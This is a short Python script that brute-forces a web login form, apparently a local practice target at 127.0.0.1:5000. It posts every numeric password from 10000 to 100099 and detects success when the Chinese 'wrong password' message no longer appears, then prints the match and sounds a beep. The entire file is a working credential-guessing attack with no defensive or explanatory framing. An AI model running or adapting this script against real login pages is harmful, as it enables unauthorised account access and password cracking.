import requests
import time
import winsound

url = "http://127.0.0.1:5000/login"

session = requests.Session()

start = time.time()
for i in range(10000, 100100):
    pw = str(i)
    resp = session.post(url, data={'password': pw}, stream=False)
    if "密碼錯誤！" not in resp.text:
        print("🎉 成功:", pw)
        winsound.Beep(1000, 500)  # 1000 Hz for 500 milliseconds
        break
    else:
        print("失敗:", pw)
end = time.time()

print(f"耗時：{end - start:.2f} 秒")
